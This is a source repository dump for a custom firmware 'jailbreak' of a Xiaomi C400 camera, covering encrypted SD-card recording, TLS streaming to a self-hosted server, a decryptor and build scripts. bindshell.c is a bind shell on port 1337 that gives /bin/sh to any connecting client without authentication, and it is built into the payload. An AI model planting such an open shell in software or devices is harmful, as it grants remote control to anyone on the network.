Hybrid Public Key Encryption scheme, without the secret key of the server,
attackers will be unable to decrypt recordings, even with a full flash dump.
Note, however, that an attacker that is able to extract the AES key from RAM
will be able to decrypt the recording currenty being written (but not the older
ones).

Because of the AEAD scheme, attackers are unable to forge new recordings, or
tamper with existing recordings, such as corrupting their bits, reordering
the frames of the file, or reordering files (by renaming) without being detected.
However, deletion of data cannot be prevented. In particular, determining
whether a file was truncated because of a power loss or by the hands of an
attacker is not possible.

To prevent easy physical tampering, the button on the back of the device will
have no effect with this firmware.

## Performance

After receiving power, about 10 seconds will be missing from the record because
the hardware needs to boot.

The device is capable of writing the 2560x1440, 20 fps HEVC and Opus stream to
the SD card and the TLS stream to the server at the same time.

The latency to the TLS server is less than a second.

On power loss, only a few frames will be lost, because the footage is sent to
the server as fast as possible, and the recording file is `fsync()`-ed regularly.

`xiaomi-c400-jailbreak/browser-viewer/main.py`:

```py
# /// script
# requires-python = ">=3.13"
# dependencies = [
#     "aiohttp==3.12.15",
# ]
# ///

import socket
from aiohttp import web

control_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
ADDR = ("socat", 2000)

routes = web.RouteTableDef()

@routes.get("/")
def index(request):
    return web.FileResponse(path="index.html")

@routes.post("/control")
async def live(request):
    d = await request.read()
    print("control", d)
    control_sock.sendto(d, ADDR)
    return web.Response(status=200)

app = web.Application()
app.add_routes(routes)
web.run_app(app)

```

`xiaomi-c400-jailbreak/build.sh`:

```sh
set -e
PREFIX=armv7l-unknown-linux-gnueabihf
CC=$PREFIX-gcc
DEPS=$(pwd)/deps
CFLAGS="$CFLAGS -nostdlib -isystem $DEPS/uClibc/include/ -isystem $DEPS/linux/include/ -Os -s -fno-stack-protector -fomit-frame-pointer -Wl,-z,norelro -mthumb"

if [ ! -f "$DEPS"/media-server/libmpeg/release.$PREFIX/libmpeg.a ]
then
    pushd "$DEPS"/media-server/libmpeg
    make CFLAGS="$CFLAGS" PLATFORM=$PREFIX RELEASE=1 STATIC_LINK=1
    popd
fi

mkdir -p build

$CC \
    $CFLAGS -Wall -Wextra \
    -I "$DEPS"/media-server/libmpeg/include -I "$DEPS"/mbedtls/include -I"$DEPS"/opus/include \
    -shared -o build/recorder.so \
    "$DEPS"/media-server/libmpeg/release.$PREFIX/objs/source/*.o \
    src/recorder.c

$CC \
    $CFLAGS -Wall -Wextra \
    -shared -o build/bindshell.so \
    src/bindshell.c

rm -rf build/tarroot/
mkdir -p build/tarroot/mnt/data/jailbreak/
cp -t build/tarroot/mnt/data/jailbreak/ \
    build/recorder.so \
    build/bindshell.so \
    src/sysctl \
    config/wpa_supplicant.conf \
    config/config.env
cp config/server.crt build/tarroot/mnt/data/jailbreak/server.crt
cp config/device.crt build/tarroot/mnt/data/jailbreak/own.crt
cp config/device.key build/tarroot/mnt/data/jailbreak/own.key
ln -s /mnt/data/jailbreak build/tarroot/mnt/data/bin

pushd build
rm -f root.tar.xz
tar --transform 's/^tarroot//' --owner 0 --group 0 -cvJf root.tar.xz tarroot
uuencode -m root.tar.xz root.tar.xz > root.tar.xz.uu 
popd

```

`xiaomi-c400-jailbreak/create_keys.sh`:

```sh
set -e
mkdir -p config private

if [ -f private/server.key ]
then
    echo private/server.key already exists, remove it first
    exit 1
fi

openssl req -x509 -newkey ec -pkeyopt ec_paramgen_curve:prime256v1 -keyout private/server.key -out config/server.crt -sha256 -days 3650 -nodes -subj "/CN=Server"
openssl req -x509 -newkey ec -pkeyopt ec_paramgen_curve:prime256v1 -keyout config/device.key -out config/device.crt -sha256 -days 3650 -nodes -subj "/CN=Device"

```

`xiaomi-c400-jailbreak/decrypt.py`:

```py
# /// script
# requires-python = ">=3.13"
# dependencies = [
#     "cryptography==44.0.2",
# ]
# ///

import argparse
from pathlib import PurePath

from cryptography.exceptions import InvalidTag
from cryptography.hazmat.primitives.asymmetric.ec import (
    ECDH,
    EllipticCurvePrivateKey,
    EllipticCurvePublicKey,
)
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.hashes import SHA256
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives.serialization import load_pem_private_key

parser = argparse.ArgumentParser()
_ = parser.add_argument(
    "-r",
    "--recording",
    required=True,
    help="recording file, from the recordings/ directory of the sd card",
    type=argparse.FileType("rb"),
)
_ = parser.add_argument(
    "-k",
    "--key",
    required=True,
    help="key file corresponding to the recording, from the keys/ directory of the sd card",
    type=argparse.FileType("rb"),
)
_ = parser.add_argument(
    "-p",
    "--privkey",
    required=True,
    help="private key corresponding to the server certificate",
    type=argparse.FileType("rb"),
)
_ = parser.add_argument(
    "-o",
    "--output",
    required=True,
    help="path to write the decrypted recording to",
    type=argparse.FileType("wb"),
)
args = parser.parse_args()

privkey = load_pem_private_key(
    args.privkey.read(),
    password=None,
)
assert isinstance(privkey, EllipticCurvePrivateKey)
key = EllipticCurvePublicKey.from_encoded_point(
    privkey.curve, args.key.read()
)
shared_secret = privkey.exchange(ECDH(), key)

recording = args.recording
header = recording.read(24)
assert len(header) == header[0] == 24, "Invalid recording header"
salt = header[1:17]
nonce_prefix = header[17:24]

derived_key = HKDF(
    SHA256(),
    16,
    salt,
    PurePath(recording.name).name.encode(),
).derive(shared_secret)
aesgcm = AESGCM(derived_key)

BLOCK_SIZE = 4096
block = recording.read(BLOCK_SIZE - 24)
assert len(block) > 0, "Recording is empty"
block_num = 0
is_last_block = False

with args.output as output:
    try:
        while not is_last_block:
            next_block = recording.read(BLOCK_SIZE)
            is_last_block = len(next_block) == 0
            iv = nonce_prefix + block_num.to_bytes(4) + is_last_block.to_bytes()
            try:
                pt = aesgcm.decrypt(iv, block, None)
            except InvalidTag:
                if is_last_block:
                    iv = nonce_prefix + block_num.to_bytes(4) + b"\0"
                    pt = aesgcm.decrypt(iv, block, None)
                    print("Warning: Data was potentially truncated!")
                else:
                    raise
            _ = output.write(pt)
            block = next_block
    except Exception:
        print("Decryption failed, recording is either corrupted on tampered!")
        raise
print("Done.")

```

`xiaomi-c400-jailbreak/default.nix`:

```nix
let
  pkgs = import (builtins.fetchTarball {
    name = "nixpkgs-25.05";
    url = "https://github.com/nixos/nixpkgs/archive/25.05.tar.gz";
    sha256 = "1915r28xc4znrh2vf4rrjnxldw2imysz819gzhk9qlrkqanmfsxd";
  }) { };
  mbedtls = pkgs.fetchFromGitHub {
    owner = "Mbed-TLS";
    repo = "mbedtls";
    rev = "v2.25.0";
    hash = "sha256-UQ0z374ptC1m7Ezomj7BuMG2+yYg+ByOGYI9zKzlceQ=";
  };
  media-server = pkgs.fetchFromGitHub {
    owner = "ireader";
    repo = "media-server";
    rev = "9356ea617b3b1c0096475b2ceb6659578cf38d0f";
    hash = "sha256-gMmTxNR4A+GOxzKCwwG+3RjJ6eymgICdUsqCgtkv458=";
  };
  libopus = pkgs.fetchFromGitHub {
    owner = "xiph";
    repo = "opus";
    rev = "v1.1.4";
    hash = "sha256-r/BMX1MNDi6vAxh6Lmqu1g6EuQ3p3WzihWOw8UHL7rQ=";
  };
  cross = pkgs.pkgsCross.armv7l-hf-multiplatform;
  linux-headers = pkgs.stdenv.mkDerivation {
    pname = "linux-headers";
    version = "4.9.84";
    src = pkgs.fetchzip {
      url = "https://www.kernel.org/pub/linux/kernel/v4.x/linux-4.9.84.tar.xz";
      hash = "sha256-fkWxCDM4Id79xpHKLRN/pPMyuEzTedout8amVAJHTF4=";
    };
    buildPhase = ''
      mkdir $out
      make INSTALL_HDR_PATH=$out ARCH=arm headers_install -j$NIX_BUILD_CORES
    '';
    dontInstall = true;
  };
  uClibc = cross.gccCrossLibcStdenv.mkDerivation {
    pname = "uClibc-ng";
    version = "1.0.31";
    src = pkgs.fetchzip {
      url = "https://downloads.uclibc-ng.org/releases/1.0.31/uClibc-ng-1.0.31.tar.xz";
      hash = "sha256-/FtD7kngHGZPAmadwHYwdXRA40TlJu4zPz+k6C87rsw=";
    };
    depsBuildBuild = [ pkgs.gcc ];
    configurePhase = ''
      cp ${./uclibc-config} .config
      make oldconfig
    '';
    makeFlags = [
      "KERNEL_HEADERS=${linux-headers}/include"
      "RUNTIME_PREFIX=$(out)/"
      "DEVEL_PREFIX=$(out)/"
    ];
  };
  jailbreak = cross.gccCrossLibcStdenv.mkDerivation {
    name = "jailbreak";
    nativeBuildInputs = [ pkgs.sharutils ];
    unpackPhase = ''
      mkdir deps
      ln -s ${mbedtls} deps/mbedtls
      ln -s ${uClibc} deps/uClibc
      ln -s ${linux-headers} deps/linux
      ln -s ${libopus} deps/opus
      cp --no-preserve=mode -r ${media-server} deps/media-server
      ln -s ${./config} config
      ln -s ${./src} src
      cp ${./build.sh} build.sh
    '';
    buildPhase = ''
      bash build.sh
    '';
    installPhase = ''
      mkdir $out
      cp build/root.tar.xz.uu $out
    '';
    dontFixup = true;
  };
in
jailbreak

```

```yml
services:
  frigate:
    container_name: frigate
    restart: unless-stopped
    stop_grace_period: 30s
    image: ghcr.io/blakeblackshear/frigate:stable
    shm_size: "512mb"
    volumes:
      - /etc/localtime:/etc/localtime:ro
      - frigate_config:/config
      - ./frigate-storage:/media/frigate
      - type: tmpfs
        target: /tmp/cache
        tmpfs:
          size: 1000000000
    configs:
      - source: frigate_config_yaml
        target: /config/config.yaml
  mediamtx:
    image: bluenviron/mediamtx
    restart: unless-stopped
    ports:
      - "8189:8189" # WebRTC
  ffmpeg:
    image: jrottenberg/ffmpeg
    restart: unless-stopped
    volumes:
      - /home/boti/Documents/dd/frigate/certs:/certs
    command: -fflags nobuffer -flags low_delay -i tcp://0.0.0.0:2000?listen -c copy -f rtsp -rtsp_transport tcp rtsp://mediamtx:8554/hevc -c:v libx264 -preset ultrafast -tune zerolatency -g 20 -c:a copy -f rtsp -rtsp_transport tcp rtsp://mediamtx:8554/h264
  socat:
    image: alpine/socat
    restart: unless-stopped
    ports:
      - "12345:12345/tcp"
    volumes:
      - ./config:/config
      - ./private:/private
    command: -d2 -T 5 OPENSSL-LISTEN:12345,forever,rcvtimeo=5,sndtimeo=5,cert=/config/server.crt,key=/private/server.key,cafile=/config/device.crt UDP-RECV:2000!!TCP:ffmpeg:2000
  browser-viewer:
    build:
      context: ./browser-viewer
      dockerfile_inline: |
        FROM python:3.13-alpine
        WORKDIR /usr/src/app
        RUN pip install --no-cache-dir aiohttp==3.12.15
        COPY . .
        CMD [ "python", "./main.py" ]
    restart: unless-stopped
  caddy:
    image: caddy:2-alpine
    restart: unless-stopped
    ports:
      - "80:80"
      - "443:443"
      - "443:443/udp"
    volumes:
      - caddy_data:/data
      - caddy_config:/config
    configs:
      - source: Caddyfile
        target: /etc/caddy/Caddyfile
configs:
  Caddyfile:
    content: |
      localhost
      handle_path /browser-viewer/streams/* {
        reverse_proxy mediamtx:8889 {
          header_down location ^/ /browser-viewer/streams/
        }
      }
      redir /browser-viewer /browser-viewer/
      handle_path /browser-viewer/* {
        reverse_proxy browser-viewer:8080
      }
      reverse_proxy frigate:8971
  frigate_config_yaml:
    content: |
      mqtt:
        enabled: false
      tls:
        enabled: false
      cameras:
        C400:
          enabled: true
          ffmpeg:
            inputs:
              - path: rtsp://mediamtx:8554/h264
                roles:
                  - detect
          detect:
            enabled: false
            width: 1280
            height: 720
      auth:
        enabled: False
      version: 0.15-1
volumes:
  caddy_data:
  caddy_config:
  frigate_config:

`xiaomi-c400-jailbreak/src/bindshell.c`:

```c
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

int host_sockid;
int client_sockid;

struct sockaddr_in hostaddr;

int main() {
  host_sockid = socket(PF_INET, SOCK_STREAM, 0);

  hostaddr.sin_family = AF_INET;
  hostaddr.sin_port = htons(1337);
  hostaddr.sin_addr.s_addr = htonl(INADDR_ANY);

  bind(host_sockid, (struct sockaddr *)&hostaddr, sizeof(hostaddr));
  listen(host_sockid, 2);

  while (1) {
    client_sockid = accept(host_sockid, NULL, NULL);
    if (!fork()) {
      dup2(client_sockid, 0);
      dup2(client_sockid, 1);
      dup2(client_sockid, 2);

      char *argv[] = {"/bin/sh", NULL};
      execve("/bin/sh", argv, NULL);
      abort();
    }
  }
  return 0;
}

__attribute__((constructor)) static void _start() { exit(main()); }

```

`xiaomi-c400-jailbreak/src/recorder.c`:

```c
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <assert.h>
#include <dirent.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <poll.h>
#include <pthread.h>
#include <spawn.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/statvfs.h>
#include <sys/types.h>
#include <unistd.h>

#include "mbedtls/ctr_drbg.h"
#include "mbedtls/debug.h"
#include "mbedtls/entropy.h"
#include "mbedtls/error.h"
#include "mbedtls/gcm.h"
#include "mbedtls/hkdf.h"
#include "mbedtls/net_sockets.h"
#include "mbedtls/ssl.h"
#include "mbedtls/ssl_cookie.h"
#include "mbedtls/timing.h"
#include "mbedtls/x509.h"

#include "mpeg-ts.h"
#include "opus.h"

struct astruct {
  int field0_0x0;
  int field1_0x4;
  uint64_t PTS;
  uint frame_size;
  uint success;
  int field6_0x18;
  uint field7_0x1c;
};

struct astruct2 {
  int audio_frame_num;
  int eBitwidth;
  int eSoundmode;
  uint64_t u64TimeStamp;
  uint u32Len;
};

enum ptz_dir {
  RIGHT,
  LEFT,
  UP,
  DOWN,
};

enum status_led {
  ORANGE_LED = 1,
  BLUE_LED = 2,
};

int board_system_init(int a, int b);
int get_video_stream(int a, uint8_t *buf, int bufsize, struct astruct *b);
int get_audio_stream_ex(uint8_t *buf, int bufsize, struct astruct2 *b);
int imi_api_led_init(void);
int imi_api_led_on(enum status_led led, uint priority);
int imi_api_led_off(enum status_led led, uint priority);
int imi_api_light_init(void);
int imi_api_light_enable(int one);
int imi_api_light_disable(int one);
int imi_api_light_brightness_set(int one, int percent);
int imi_api_ircut_init(void);
int imi_api_ircut_switch(int enabled);

int hal_motor_init(void);
int hal_motor_speed_set(int param_1);
int hal_motor_dir_set(enum ptz_dir param_2);
int hal_motor_step_set(int param_3);
int hal_motor_run(void);
int hal_motor_stop(void);

#define AUDIO_FRAME_TIME_MS 40
#define AUDIO_HZ 16000
#define AUDIO_FRAME_SIZE (AUDIO_HZ * AUDIO_FRAME_TIME_MS / 1000)
#define RECORDINGS_PATH "/mnt/sdcard/recordings"
#define KEYS_PATH "/mnt/sdcard/keys"
#define OUTPUT_BLOCK_LEN 4096
#define PIPE_TO_TLS "/tmp/pipe_to_tls"
#define PIPE_TO_TLS_BUFFER (4 * 1024 * 1024) // 4 MiB

uint8_t VIDEO_BUF[0x80000];
int16_t AUDIO_BUF[AUDIO_FRAME_SIZE];
uint8_t AUDIO_OPUS[4000];
uint8_t OUTPUT_BUF[OUTPUT_BLOCK_LEN * 2];
size_t max_filesize = 1024 * 1024 * 1024; // 1 GiB
int max_file_count = 60000;
FILE *current_output_file = NULL;
int has_sdcard = 0;
size_t output_buf_len = 0;
size_t next_encrypt_block_len = 0;
uint32_t output_block_counter = 0;
int pipe_to_tls_fd = -1;
int have_filter_switch_thread = 0;
pthread_t filter_switch_thread;

mbedtls_net_context net_ctx;
mbedtls_entropy_context entropy;
mbedtls_ctr_drbg_context ctr_drbg;
mbedtls_ssl_context ssl;
mbedtls_ssl_config conf;
mbedtls_x509_crt server_cert;
mbedtls_ecp_keypair *server_pubkey;
mbedtls_x509_crt own_cert;
mbedtls_pk_context own_key;
mbedtls_timing_delay_context timer;
mbedtls_gcm_context recording_gcm;
uint8_t recording_nonce_prefix[7];

static uint64_t available_bytes_for_recording() {
  int r;
  struct statvfs s;
  r = statvfs(RECORDINGS_PATH, &s);
  assert(r == 0 && "Unable to get available space for recording");
  return (uint64_t)s.f_bavail * (uint64_t)s.f_bsize;
}

static void open_new_file() {
  int r;
  if (current_output_file != NULL) {
    fclose(current_output_file);
    current_output_file = NULL;
  }
  r = mkdir(RECORDINGS_PATH, 0777);
  assert((r == 0 || errno == EEXIST) &&
         "Unable to create recordings directory");
  r = chdir(RECORDINGS_PATH);
  assert(r == 0 && "Unable to access recordings directory");
  struct dirent **entries;
  r = scandir(".", &entries, NULL, versionsort);
  assert(r >= 0 && "Unable to scan recordings directory");
  int file_count = r;
  int new_file_count = file_count;
  int next_file_num = 1;
  for (int i = 0; i < file_count; i++) {
    if (entries[i]->d_name[0] == '.')
      continue;
    int this_file_num;
    sscanf(entries[i]->d_name, "%d", &this_file_num);
    if (this_file_num >= next_file_num) {
      next_file_num = this_file_num + 1;
    }
    uint64_t available = available_bytes_for_recording();
    if (new_file_count > max_file_count || available < max_filesize * 2) {
      printf("%llu bytes available\n", available);
      printf("Deleting recording %s\n", entries[i]->d_name);
      unlink(entries[i]->d_name);
      new_file_count--;
    }
    free(entries[i]);
  }
  free(entries);
  char next_file_name[256];
  r = snprintf(next_file_name, sizeof(next_file_name), "%d", next_file_num);
  assert(r > 0 && (size_t)r < sizeof(next_file_name) - 1 &&
         "Unable to calculate next filename");
  printf("Recording to new file: %s\n", next_file_name);
  current_output_file = fopen(next_file_name, "w");
  assert(current_output_file != NULL && "Unable to create new recording file");

  r = mkdir(KEYS_PATH, 0777);
  assert((r == 0 || errno == EEXIST) && "Unable to create keys directory");
  r = chdir(KEYS_PATH);
  assert(r == 0 && "Unable to access keys directory");
  FILE *key_file = fopen(next_file_name, "w");
  assert(key_file != NULL && "Unable to create new key file");

  mbedtls_ecp_keypair ephemeral_key;
  mbedtls_ecp_keypair_init(&ephemeral_key);
  r = mbedtls_ecp_gen_key(server_pubkey->grp.id, &ephemeral_key,
                          mbedtls_ctr_drbg_random, &ctr_drbg);
  assert(r == 0 && "Unable to generate ephemeral recording key");
  uint8_t ephemeral_pubkey_bytes[MBEDTLS_MPI_MAX_SIZE * 4];
  size_t ephemeral_pubkey_bytes_len = 0;
  r = mbedtls_ecp_point_write_binary(
      &ephemeral_key.grp, &ephemeral_key.Q, MBEDTLS_ECP_PF_COMPRESSED,
      &ephemeral_pubkey_bytes_len, ephemeral_pubkey_bytes,
      sizeof(ephemeral_pubkey_bytes));
  assert(r == 0 && ephemeral_pubkey_bytes_len > 0 &&
         "Unable to serialize ephemeral recording key");
  r = fwrite(ephemeral_pubkey_bytes, ephemeral_pubkey_bytes_len, 1, key_file);
  assert(r == 1 && "Unable to write ephemeral recording key");
  fflush(key_file);
  fsync(fileno(key_file));
  r = fclose(key_file);
  assert(r == 0 && "Unable to sync ephemeral recording key");

  mbedtls_ecdh_context ecdh;
  mbedtls_ecdh_init(&ecdh);
  r = mbedtls_ecdh_get_params(&ecdh, &ephemeral_key, MBEDTLS_ECDH_OURS);
  assert(r == 0 && "Unable to ECDH with ephemeral key");
  r = mbedtls_ecdh_get_params(&ecdh, server_pubkey, MBEDTLS_ECDH_THEIRS);
  assert(r == 0 && "Unable to ECDH with server key");

  uint8_t shared_secret[MBEDTLS_MPI_MAX_SIZE];
  size_t shared_secret_len = 0;
  r = mbedtls_ecdh_calc_secret(&ecdh, &shared_secret_len, shared_secret,
                               sizeof(shared_secret), mbedtls_ctr_drbg_random,
                               &ctr_drbg);
  assert(r == 0 && shared_secret_len >= 16 && "ECDH failed");
  mbedtls_ecdh_free(&ecdh);
  mbedtls_ecp_keypair_free(&ephemeral_key);

  uint8_t salt[16];
  r = mbedtls_ctr_drbg_random(&ctr_drbg, salt, sizeof(salt));
  assert(r == 0 && "Salt generation failed");
  r = mbedtls_ctr_drbg_random(&ctr_drbg, recording_nonce_prefix,
                              sizeof(recording_nonce_prefix));
  assert(r == 0 && "Nonce generation failed");

  const mbedtls_md_info_t *md_info =
      mbedtls_md_info_from_type(MBEDTLS_MD_SHA256);
  assert(md_info != NULL && "SHA256 not supported");
  uint8_t derived_key[16];
  r = mbedtls_hkdf(md_info, salt, sizeof(salt), shared_secret,
                   shared_secret_len, (uint8_t *)next_file_name,
                   strlen(next_file_name), derived_key, sizeof(derived_key));
  assert(r == 0 && "HKDF failed");
  mbedtls_gcm_free(&recording_gcm);
  r = mbedtls_gcm_setkey(&recording_gcm, MBEDTLS_CIPHER_ID_AES, derived_key,
                         128);
  assert(r == 0 && "AES-GCM init failed");

  r = fputc_unlocked(24, current_output_file); // header length
  assert(r != EOF && "Unable to write header size");
  r = fwrite_unlocked(salt, sizeof(salt), 1, current_output_file);
  assert(r == 1 && "Unable to write salt");
  r = fwrite_unlocked(recording_nonce_prefix, sizeof(recording_nonce_prefix), 1,
                      current_output_file);
  assert(r == 1 && "Unable to write nonce");

  output_buf_len = 0;
  next_encrypt_block_len = OUTPUT_BLOCK_LEN - 24 - 16;
  output_block_counter = 0;
}

static void write_to_sdcard(const void *packet, size_t bytes) {
  int r;
  assert(output_buf_len + bytes < sizeof(OUTPUT_BUF) &&
         "Output buffer overflow");
  memcpy(OUTPUT_BUF + output_buf_len, packet, bytes);
  output_buf_len += bytes;
  while (output_buf_len >= next_encrypt_block_len) {
    int last_block_in_file =
        (output_block_counter + 1) * OUTPUT_BLOCK_LEN >= max_filesize;
    uint8_t iv[12];
    memcpy(iv, recording_nonce_prefix, 7);
    iv[7] = (output_block_counter >> 24) & 0xff;
    iv[8] = (output_block_counter >> 16) & 0xff;
    iv[9] = (output_block_counter >> 8) & 0xff;
    iv[10] = (output_block_counter >> 0) & 0xff;
    iv[11] = last_block_in_file;
    uint8_t output[OUTPUT_BLOCK_LEN];
    r = mbedtls_gcm_crypt_and_tag(&recording_gcm, MBEDTLS_GCM_ENCRYPT,
                                  next_encrypt_block_len, iv, sizeof(iv), NULL,
                                  0, OUTPUT_BUF, output, 16,
                                  output + next_encrypt_block_len);
    assert(r == 0 && "Recording encryption failed");
    r = fwrite_unlocked(output, next_encrypt_block_len + 16, 1,
                        current_output_file);
    assert(r == 1 && "Unable to write to recording file");
    output_buf_len -= next_encrypt_block_len;
    memmove(OUTPUT_BUF, OUTPUT_BUF + next_encrypt_block_len, output_buf_len);

    next_encrypt_block_len = OUTPUT_BLOCK_LEN - 16;
    if (last_block_in_file) {
      open_new_file();
    }
  }
}

static void *do_filter_switch(void *x) {
  int r = imi_api_ircut_switch((int)x);
  assert(r == 0 && "failed to toggle IR filter");
  return 0;
}

static int do_send_to_server() {
  int r;

  r = hal_motor_init();
  assert(r == 0 && "hal_motor_init failed");
  r = hal_motor_speed_set(100);
  assert(r == 0 && "hal_motor_speed_set failed");
  r = hal_motor_step_set(10);
  assert(r == 0 && "hal_motor_step_set failed");

  r = imi_api_ircut_init();
  assert(r == 0 && "imi_api_ircut_init failed");

  r = mbedtls_x509_crt_parse_file(&own_cert, "/mnt/data/jailbreak/own.crt");
  assert(r == 0 && "Unable to parse own certificate");

  r = mbedtls_pk_parse_keyfile(&own_key, "/mnt/data/jailbreak/own.key", NULL);
  assert(r == 0 && "Unable to parse private key");

  const char *server_addr = getenv("SERVER_ADDR");
  assert(server_addr != NULL && "SERVER_ADDR not set");

  const char *server_port_str = getenv("SERVER_PORT");
  assert(server_port_str != NULL && "SERVER_PORT not set");

  r = mbedtls_net_connect(&net_ctx, server_addr, server_port_str,
                          MBEDTLS_NET_PROTO_TCP);
  assert(r == 0 && "Unable to connect to server");

  r = mbedtls_net_set_nonblock(&net_ctx);
  assert(r == 0 && "Unable to set socket to nonblocking");

  r = mbedtls_ssl_config_defaults(&conf, MBEDTLS_SSL_IS_CLIENT,
                                  MBEDTLS_SSL_TRANSPORT_STREAM,
                                  MBEDTLS_SSL_PRESET_DEFAULT);
  assert(r == 0 && "Failed to initialize TLS config");

  mbedtls_ssl_conf_authmode(&conf, MBEDTLS_SSL_VERIFY_REQUIRED);
  mbedtls_ssl_conf_rng(&conf, mbedtls_ctr_drbg_random, &ctr_drbg);
  mbedtls_ssl_conf_ca_chain(&conf, &server_cert, NULL);
  r = mbedtls_ssl_conf_own_cert(&conf, &own_cert, &own_key);
  assert(r == 0);

  r = mbedtls_ssl_setup(&ssl, &conf);
  assert(r == 0 && "Failed to setup TLS config");

  mbedtls_ssl_set_bio(&ssl, &net_ctx, mbedtls_net_send, mbedtls_net_recv, NULL);

  do {
    r = mbedtls_ssl_handshake(&ssl);
  } while (r == MBEDTLS_ERR_SSL_WANT_READ || r == MBEDTLS_ERR_SSL_WANT_WRITE);
  assert(r == 0 && "TLS handshake failed");

  pipe_to_tls_fd = open(PIPE_TO_TLS, O_RDWR);
  assert(pipe_to_tls_fd >= 0 && "Unable to open pipe to TLS");
  r = fcntl(pipe_to_tls_fd, F_SETPIPE_SZ, PIPE_TO_TLS_BUFFER);
  assert(r == PIPE_TO_TLS_BUFFER && "Unable to set pipe buffer");

  struct pollfd pollfds[2];
  pollfds[0].fd = net_ctx.fd;
  pollfds[0].events = POLLIN;
  pollfds[1].fd = net_ctx.fd;
  pollfds[1].events = POLLOUT;

  while (1) {
    r = read(pipe_to_tls_fd, VIDEO_BUF, sizeof(VIDEO_BUF));
    assert(r > 0 && "Unable to read recording feed");
    {
      size_t len = (size_t)r;
      uint8_t *buf = VIDEO_BUF;
      while (len > 0) {
        while (1) {
          r = mbedtls_ssl_write(&ssl, buf, len);
          if (r == MBEDTLS_ERR_SSL_WANT_READ) {
            r = poll(&pollfds[0], 1, 5000);
            assert(r == 1);
          } else if (r == MBEDTLS_ERR_SSL_WANT_WRITE) {
            r = poll(&pollfds[1], 1, 5000);
            assert(r == 1);
          } else {
            assert(r > 0 && "TLS send failed");
            imi_api_led_on(BLUE_LED, 1);
            break;
          }
        }
        buf += r;
        len -= r;
      }
    }

    uint8_t command = 0;
    r = mbedtls_ssl_read(&ssl, &command, 1);
    if (r != MBEDTLS_ERR_SSL_WANT_READ && r != MBEDTLS_ERR_SSL_WANT_WRITE) {
      assert(r == 1 && "TLS read failed");
      printf("command: %u\n", command);
      switch (command) {
      case 'l': {
        r = hal_motor_dir_set(LEFT);
        assert(r == 0 && "hal_motor_dir_set failed");
        r = hal_motor_run();
        assert(r == 0 && "hal_motor_run failed");
      } break;
      case 'r': {
        r = hal_motor_dir_set(RIGHT);
        assert(r == 0 && "hal_motor_dir_set failed");
        r = hal_motor_run();
        assert(r == 0 && "hal_motor_run failed");
      } break;
      case 'u': {
        r = hal_motor_dir_set(UP);
        assert(r == 0 && "hal_motor_dir_set failed");
        r = hal_motor_run();
        assert(r == 0 && "hal_motor_run failed");
      } break;
      case 'd': {
        r = hal_motor_dir_set(DOWN);
        assert(r == 0 && "hal_motor_dir_set failed");
        r = hal_motor_run();
        assert(r == 0 && "hal_motor_run failed");
      } break;
      case 'f':
      case 'F': {
        int ready = 1;
        if (have_filter_switch_thread) {
          r = pthread_tryjoin_np(filter_switch_thread, NULL);
          if (r == EBUSY) {
            ready = 0;
          } else {
            assert(r == 0 && "failed to join filter switch thread");
          }
        }
        if (ready) {
          r = pthread_create(&filter_switch_thread, NULL, do_filter_switch,
                             (void *)(command == 'F'));
          assert(r == 0 && "failed to create filter switch thread");
          have_filter_switch_thread = 1;
        }
      } break;
      }
    }
  }
  return 0;
}

static void *ts_alloc(void *, size_t bytes) { return malloc(bytes); }
static void ts_free(void *, void *packet) { free(packet); }
static int ts_write(void *, const void *packet, size_t bytes) {
  if (has_sdcard) {
    write_to_sdcard(packet, bytes);
  }
  write(pipe_to_tls_fd, packet, bytes);
  return 0;
}

int main() {
  int is_sender = getenv("SEND_TO_SERVER") != NULL;
  if (is_sender) {
    puts("TLS sender starting...");
  } else {
    puts("Recorder starting...");
  }

  int r;

  r = imi_api_led_init();
  assert(r == 0 && "imi_api_led_init failed");

  if (is_sender) {
    imi_api_led_off(BLUE_LED, 1);
  } else {
    imi_api_led_off(ORANGE_LED, 0);
  }

  mbedtls_x509_crt_init(&server_cert);
  mbedtls_ctr_drbg_init(&ctr_drbg);
  mbedtls_gcm_init(&recording_gcm);
  mbedtls_entropy_init(&entropy);
  const char *pers = "C400-mbedtls";
  r = mbedtls_ctr_drbg_seed(&ctr_drbg, mbedtls_entropy_func, &entropy,
                            (const unsigned char *)pers, strlen(pers));
  assert(r == 0 && "Unable to initialize random number generator");

  r = mbedtls_x509_crt_parse_file(&server_cert,
                                  "/mnt/data/jailbreak/server.crt");
  assert(r == 0 && "Unable to parse server certificate");

  r = mbedtls_pk_can_do(&server_cert.pk, MBEDTLS_PK_ECKEY_DH);
  assert(r == 1 && "Cannot do ECDH with this server certificate");
  server_pubkey = mbedtls_pk_ec(server_cert.pk);

  if (is_sender) {
    return do_send_to_server();
  }

  // open read-write to make sure we succeed, since there is always a reader
  pipe_to_tls_fd = open(PIPE_TO_TLS, O_RDWR | O_NONBLOCK);
  assert(pipe_to_tls_fd >= 0 && "Unable to open pipe to TLS");
  r = fcntl(pipe_to_tls_fd, F_SETPIPE_SZ, PIPE_TO_TLS_BUFFER);
  assert(r == PIPE_TO_TLS_BUFFER && "Unable to set pipe buffer");

  has_sdcard = !!getenv("HAS_SDCARD");
  if (has_sdcard) {
    open_new_file();
  }

  r = imi_api_light_init();
  assert(r == 0 && "imi_api_light_init failed");
  r = imi_api_light_brightness_set(1, 100);
  assert(r == 0 && "imi_api_light_brightness_set failed");
  r = imi_api_light_enable(1);
  assert(r == 0 && "imi_api_light_enable failed");

  OpusEncoder *enc =
      opus_encoder_create(AUDIO_HZ, 1, OPUS_APPLICATION_AUDIO, &r);
  assert(r == 0 && "Unable to create OPUS encoder");

  void *ts = mpeg_ts_create(
      &(struct mpeg_ts_func_t){ts_alloc, ts_free, ts_write}, NULL);
  assert(ts != NULL && "Unable to create MPEG-TS muxer");

  r = mpeg_ts_add_stream(ts, PSI_STREAM_H265, NULL, 0);
  assert(r > 0 && "Unable to add H265 video stream");
  int hevc_stream_id = r;
